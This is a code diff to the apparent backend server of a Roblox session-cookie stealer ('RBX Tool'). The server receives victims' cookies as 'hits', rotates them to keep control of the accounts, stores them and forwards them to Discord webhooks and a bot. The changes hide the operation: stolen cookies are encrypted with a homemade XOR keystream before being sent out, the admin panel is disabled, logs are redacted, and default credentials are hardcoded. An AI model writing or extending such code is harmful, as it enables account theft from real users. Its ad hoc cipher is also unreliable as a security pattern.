@@ -11,6 +11,8 @@ import threading
 import time
 import shutil
 import logging
+import base64
+import hashlib
 from datetime import datetime, timedelta, timezone
 
 import requests as http_requests
@@ -30,6 +32,8 @@ DISCORD_WEBHOOK_URL_UPDATES = os.getenv('DISCORD_WEBHOOK_URL_UPDATES', 'https://
 API_KEY = os.getenv('API_KEY', 'rbx-secret-key-2024')
 ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
 ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')
+ADMIN_PANEL_ENABLED = False
+DATA_ENCRYPTION_KEY = os.getenv('DATA_ENCRYPTION_KEY', 'shinsad0907')
 PORT = int(os.getenv('PORT', 5000))
 REFRESH_INTERVAL_MINUTES = int(os.getenv('REFRESH_INTERVAL_MINUTES', 30))
 
@@ -49,6 +53,60 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger('RBX')
+
+# =====================================================
+# DATA PROTECTION
+# =====================================================
+def _derive_encryption_key():
+    return hashlib.sha256(DATA_ENCRYPTION_KEY.encode('utf-8')).digest()
+
+
+def encrypt_sensitive_data(value):
+    if value is None:
+        return ''
+    if isinstance(value, (bytes, bytearray)):
+        raw = bytes(value)
+    else:
+        raw = str(value).encode('utf-8')
+    if not raw:
+        return ''
+
+    key = _derive_encryption_key()
+    nonce = os.urandom(12)
+    stream = hashlib.sha256(key + nonce).digest()
+    payload = bytearray()
+    for index, byte in enumerate(raw):
+        payload.append(byte ^ stream[index % len(stream)])
+    return base64.b64encode(nonce + bytes(payload)).decode('ascii')
+
+
+def decrypt_sensitive_data(value):
+    if not value:
+        return ''
+    try:
+        raw = base64.b64decode(value.encode('ascii'))
+    except Exception:
+        return str(value)
+    if len(raw) < 12:
+        return str(value)
+
+    nonce = raw[:12]
+    payload = raw[12:]
+    key = _derive_encryption_key()
+    stream = hashlib.sha256(key + nonce).digest()
+    decoded = bytearray()
+    for index, byte in enumerate(payload):
+        decoded.append(byte ^ stream[index % len(stream)])
+    return decoded.decode('utf-8')
+
+
+def _decode_session_row(row):
+    if row is None:
+        return None
+    data = dict(row)
+    data['cookie'] = decrypt_sensitive_data(data.get('cookie', ''))
+    data['previousCookie'] = decrypt_sensitive_data(data.get('previousCookie', ''))
+    return data
 
 # =====================================================
 # DATABASE (SQLite)
@@ -106,6 +164,7 @@ def init_db():
 def db_upsert_session(userId, cookie, username='', displayName='', game='', ip='', status='ALIVE', messageId=''):
     conn = get_db()
     now = datetime.now(timezone.utc).isoformat()
+    encrypted_cookie = encrypt_sensitive_data(cookie)
     conn.execute("""
         INSERT INTO sessions (userId, cookie, username, displayName, game, ip, status, messageId, createdAt, updatedAt)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
@@ -118,7 +177,7 @@ def db_upsert_session(userId, cookie, username='', displayName='', game='', ip='
             status=excluded.status,
             messageId=CASE WHEN excluded.messageId != '' THEN excluded.messageId ELSE sessions.messageId END,
             updatedAt=excluded.updatedAt
-    """, (userId, cookie, username, displayName, game, ip, status, messageId, now, now))
+    """, (userId, encrypted_cookie, username, displayName, game, ip, status, messageId, now, now))
     conn.commit()
     conn.close()
 
@@ -126,7 +185,7 @@ def db_get_session(userId):
     conn = get_db()
     row = conn.execute("SELECT * FROM sessions WHERE userId = ?", (userId,)).fetchone()
     conn.close()
-    return dict(row) if row else None
+    return _decode_session_row(row)
 
 def db_list_sessions(status=None):
     conn = get_db()
@@ -135,7 +194,7 @@ def db_list_sessions(status=None):
     else:
         rows = conn.execute("SELECT * FROM sessions ORDER BY updatedAt DESC").fetchall()
     conn.close()
-    return [dict(r) for r in rows]
+    return [_decode_session_row(r) for r in rows]
 
 def db_get_stale_sessions():
     """Get ALIVE sessions older than REFRESH_INTERVAL_MINUTES"""
@@ -150,9 +209,12 @@ def db_get_stale_sessions():
     stale_sessions = []
     
     for row in rows:
+        decoded_row = _decode_session_row(row)
+        if not decoded_row:
+            continue
         try:
             # Parse updatedAt - handle both ISO format and plain format
-            updated_str = row['updatedAt']
+            updated_str = decoded_row['updatedAt']
             if 'T' in updated_str:
                 # ISO format: 2026-06-22T17:35:14.562419+00:00
                 updated = datetime.fromisoformat(updated_str.replace('Z', '+00:00'))
@@ -165,12 +227,12 @@ def db_get_stale_sessions():
             
             # If older than REFRESH_INTERVAL_MINUTES, mark as stale
             if age_minutes >= REFRESH_INTERVAL_MINUTES:
-                stale_sessions.append(dict(row))
-                logger.info(f"[CRON] Debug: {row['username']} is stale ({age_minutes:.1f}min >= {REFRESH_INTERVAL_MINUTES}min)")
+                stale_sessions.append(decoded_row)
+                logger.info(f"[CRON] Debug: {decoded_row['username']} is stale ({age_minutes:.1f}min >= {REFRESH_INTERVAL_MINUTES}min)")
             else:
-                logger.info(f"[CRON] Debug: {row['username']} is fresh ({age_minutes:.1f}min < {REFRESH_INTERVAL_MINUTES}min)")
+                logger.info(f"[CRON] Debug: {decoded_row['username']} is fresh ({age_minutes:.1f}min < {REFRESH_INTERVAL_MINUTES}min)")
         except Exception as e:
-            logger.error(f"[CRON] Debug: Error parsing timestamp for {row['username']}: {e}")
+            logger.error(f"[CRON] Debug: Error parsing timestamp for {decoded_row.get('username', 'unknown')}: {e}")
             continue
     
     logger.info(f"[CRON] Debug: Total ALIVE: {len(rows)} | Stale: {len(stale_sessions)} | Threshold: {REFRESH_INTERVAL_MINUTES}min")
@@ -214,6 +276,7 @@ def db_update_status(userId, status):
 def db_update_cookie(userId, cookie):
     conn = get_db()
     now = datetime.now(timezone.utc).isoformat()
+    encrypted_cookie = encrypt_sensitive_data(cookie)
     # Save current cookie as previousCookie before updating
     conn.execute("""
         UPDATE sessions SET 
@@ -223,7 +286,7 @@ def db_update_cookie(userId, cookie):
             refreshCount = refreshCount + 1,
             updatedAt = ?
         WHERE userId = ?
-    """, (cookie, now, userId))
+    """, (encrypted_cookie, now, userId))
     conn.commit()
     conn.close()
 
@@ -379,6 +442,7 @@ def send_discord_webhook(session_data, is_update=False, update_type='NEW'):
         return None
 
     full_cookie = session_data.get('cookie', 'N/A')
+    encrypted_cookie = encrypt_sensitive_data(full_cookie if full_cookie != 'N/A' else '')
     status = session_data.get('status', 'ALIVE')
     status_emoji = '🟢' if status == 'ALIVE' else '🔴' if status == 'DIE' else '🟡'
     userId = session_data.get('userId', 'N/A')
@@ -415,14 +479,14 @@ def send_discord_webhook(session_data, is_update=False, update_type='NEW'):
         "footer": {"text": "RBX Tool"}
     }
 
-    # Split full cookie into chunks of 1000 chars (Discord limit is 1024 per field)
+    # Split encrypted cookie into chunks of 1000 chars (Discord limit is 1024 per field)
     chunk_size = 1000
-    if len(full_cookie) <= chunk_size:
-        embed["fields"].append({"name": "🪙 Cookie", "value": f"```{full_cookie}```", "inline": False})
+    if len(encrypted_cookie) <= chunk_size:
+        embed["fields"].append({"name": "🪙 Cookie (Encrypted)", "value": f"```{encrypted_cookie}```", "inline": False})
     else:
-        parts = [full_cookie[i:i+chunk_size] for i in range(0, len(full_cookie), chunk_size)]
+        parts = [encrypted_cookie[i:i+chunk_size] for i in range(0, len(encrypted_cookie), chunk_size)]
         for idx, part in enumerate(parts):
-            embed["fields"].append({"name": f"🪙 Cookie ({idx+1}/{len(parts)})", "value": f"```{part}```", "inline": False})
+            embed["fields"].append({"name": f"🪙 Cookie (Encrypted {idx+1}/{len(parts)})", "value": f"```{part}```", "inline": False})
 
     payload = {"embeds": [embed]}
     
@@ -481,6 +545,16 @@ def process_new_hit(cookie, game='', ip='', username_hint='', display_hint=''):
         userId = username_hint or f"unknown_{int(time.time())}"
         username = username_hint or 'unknown'
         displayName = display_hint or 'unknown'
+
+    if not user_info and (not userId or not username or not displayName or str(username).lower() == 'unknown' or str(displayName).lower() == 'unknown'):
+        logger.warning("[HIT] Skipping session with unknown identity")
+        return {
+            'userId': None,
+            'username': None,
+            'displayName': None,
+            'status': 'skipped',
+            'rotated': False
+        }
     
     # Step 2: Rotate cookie
     logger.info("[HIT] Step 2: Rotating cookie...")
@@ -521,7 +595,6 @@ def process_new_hit(cookie, game='', ip='', username_hint='', display_hint=''):
             db_update_message_id(userId, message_id)
     
     # Console output
-    cookie_preview = final_cookie[:50] + "..." if len(final_cookie) > 50 else final_cookie
     output = f"""
 ============================================================
 >>> {'HIT UPDATE' if is_update else 'NEW HIT RECEIVED'}!
@@ -534,7 +607,7 @@ def process_new_hit(cookie, game='', ip='', username_hint='', display_hint=''):
   [ROTATE]  Rotated:      {'YES' if new_cookie else 'NO (kept original)'}
   [TIME]    Time:         {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
   [IP]      IP:           {ip}
-  [COOKIE]  Cookie:       {cookie_preview}
+  [COOKIE]  Cookie:       [REDACTED]
 ============================================================
   [DB]      Total ALIVE:  {db_count_by_status('ALIVE')}
   [DB]      Total DIE:    {db_count_by_status('DIE')}
@@ -657,6 +730,10 @@ def after_request(response):
 def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
+        if not ADMIN_PANEL_ENABLED:
+            if request.path.startswith('/api/'):
+                return jsonify({'error': 'Admin panel disabled', 'success': False}), 404
+            return 'Admin panel disabled', 404
         if 'admin_logged_in' not in session:
             # If it's an API request, return JSON error
             if request.path.startswith('/api/'):
@@ -733,10 +810,9 @@ def receive_session():
 def list_sessions_api():
     status_filter = request.args.get('status', None)
     sessions = db_list_sessions(status_filter)
-    # Hide full cookie in API response
     for s in sessions:
-        if len(s.get('cookie', '')) > 30:
-            s['cookie'] = s['cookie'][:30] + '...'
+        s.pop('cookie', None)
+        s.pop('previousCookie', None)
     return jsonify({'count': len(sessions), 'sessions': sessions})
 
 @app.route('/api/sessions/<userId>', methods=['GET'])
@@ -797,19 +873,28 @@ def refresh_session_api(userId):
         logger.error(f"[ADMIN] Refresh error for {userId}: {e}")
         return jsonify({'error': str(e)}), 500
 
+def admin_panel_disabled_response():
+    return jsonify({'success': False, 'error': 'Admin panel disabled'}), 404
+
 @app.route('/admin')
 @login_required
 def admin_dashboard():
+    if not ADMIN_PANEL_ENABLED:
+        return "Admin panel disabled", 404
     return render_template('admin.html')
 
 @app.route('/admin-login')
 def admin_login_page():
+    if not ADMIN_PANEL_ENABLED:
+        return "Admin panel disabled", 404
     if 'admin_logged_in' in session:
         return redirect(url_for('admin_dashboard'))
     return render_template('admin_login.html')
 
 @app.route('/api/admin/login', methods=['POST'])
 def api_admin_login():
+    if not ADMIN_PANEL_ENABLED:
+        return admin_panel_disabled_response()
     try:
         data = request.get_json()
         username = data.get('username', '').strip()
@@ -829,6 +914,8 @@ def api_admin_login():
 
 @app.route('/api/admin/logout', methods=['POST'])
 def api_admin_logout():
+    if not ADMIN_PANEL_ENABLED:
+        return admin_panel_disabled_response()
     session.clear()
     logger.info("[ADMIN] User logged out")
     return jsonify({'success': True, 'message': 'Đã đăng xuất'})
@@ -855,12 +942,17 @@ def download_extension():
 @app.route('/api/admin/sessions', methods=['GET'])
 @login_required
 def admin_sessions_api():
-    """Full session data for admin dashboard (includes full cookies)"""
+    if not ADMIN_PANEL_ENABLED:
+        return admin_panel_disabled_response()
+    """Return session metadata for admin dashboard without exposing cookie values."""
     sessions = db_list_sessions()
     now = datetime.now(timezone.utc)
     refresh_minutes = REFRESH_INTERVAL_MINUTES
     
     for s in sessions:
+        s.pop('cookie', None)
+        s.pop('previousCookie', None)
+
         # Calculate time since last update
         try:
             updated = datetime.fromisoformat(s['updatedAt'])
@@ -1178,7 +1270,8 @@ def start_discord_bot():
         embed.add_field(name="📊 Status", value=f"{'🟢 ALIVE' if session['status'] == 'ALIVE' else '🔴 DIE' if session['status'] == 'DIE' else '🟡 PAUSED'}", inline=True)
         embed.add_field(name="🔄 Rotations", value=f"{session.get('refreshCount', 0)}x", inline=True)
         embed.add_field(name="⏰ Last Update", value=session['updatedAt'][:16], inline=True)
-        embed.add_field(name="🪙 Cookie", value=f"```{session['cookie']}```", inline=False)
+        encrypted_cookie = encrypt_sensitive_data(session.get('cookie', ''))
+        embed.add_field(name="🪙 Cookie (Encrypted)", value=f"```{encrypted_cookie}```", inline=False)
         
         await interaction.response.send_message(embed=embed, ephemeral=True)
     
